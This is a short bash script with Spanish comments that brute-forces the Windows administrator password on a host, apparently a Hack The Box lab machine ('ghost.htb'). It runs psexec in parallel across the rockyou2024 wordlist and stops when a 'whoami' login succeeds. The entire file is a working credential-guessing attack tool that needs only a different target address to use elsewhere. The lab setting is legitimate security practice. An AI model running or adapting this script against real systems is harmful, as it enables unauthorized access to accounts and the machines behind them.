#!/bin/bash

host="10.10.11.24" # Reemplaza con el nombre de host o IP de la máquina
user="administrator"
domain="ghost.htb" # Reemplaza con el dominio adecuado, si aplica
password_file="/usr/share/wordlists/rockyou2024.txt"
max_threads=20

if [ ! -f "$password_file" ]; then
	echo "No se encontró el archivo $password_file"
	exit 1
fi

# Función para ejecutar psexec y verificar la salida
function execute_psexec {
	local password="$1"

	printf "Intentando con contraseña: %s\r" "$password"
	psexec \\\\$host -u $domain\\$user -p $password whoami >/dev/null 2>&1
	local result=$?

	if [ $result -eq 0 ]; then
		printf "\nContraseña correcta encontrada: %s\n" "$password"
		exit 0 # Termina el script cuando se encuentra la contraseña correcta
	fi
}

# Iterar sobre las contraseñas en el archivo utilizando hilos
while IFS= read -r password; do
	execute_psexec "$password" &
	# Limitar el número de hilos activos
	while [ $(jobs | wc -l) -ge $max_threads ]; do
		sleep 0.1
	done
done <"$password_file"

wait # Espera a que todos los hilos terminen antes de finalizar el script
